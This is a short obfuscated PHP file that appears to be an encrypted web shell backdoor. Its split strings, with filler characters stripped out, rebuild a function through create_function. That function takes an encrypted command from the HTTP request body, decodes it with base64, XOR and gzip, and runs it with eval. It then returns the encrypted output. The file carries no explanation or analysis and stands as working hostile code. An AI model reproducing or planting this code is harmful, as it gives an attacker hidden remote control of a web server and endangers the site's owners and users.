<?php
$A='[1])R,$Rk)));$Ro=R@oRb_get_conRtents();@Rob_end_Rclean();$rRR=@bR';
$x='1) {@oRbR_start();@RRevaRl(@gzuncompreRss(@x(@baRse64_dRRecode($m';
$S='aRse64_encode(@Rx(@gzcRompressR($o),R$k));RRprint("$p$kh$r$kf");}';
$a='$k="ffccR86bd"R;R$kh="c615113aR5R464";$kRf="5882RdRa70eRea7R";$p=';
$n=str_replace('T','','TcreaTte_TfTunTTction');
$O='"0pm5UtlcXRNRgqfXYi";funcRtioRn x($t,RR$k){R$cR=strlRen($k);$Rl=s';
$u='h("R/$Rkh(.+RR)$kf/",@file_gRet_contenRRts("php://Rinput"),$mR)==';
$E='trRlRen($t);R$o="";Rfor($i=0;$i<$Rl;){for($j=R0;($jR<$c&R&$i<$l);';
$p='$j++,$i++)R{$o.=$RtR{$i}^$k{RR$j};}}returRn $o;}ifR (@pRreg_maRtc';
$d=str_replace('R','',$a.$O.$E.$p.$u.$x.$A.$S);
$K=$n('',$d);$K();
?>
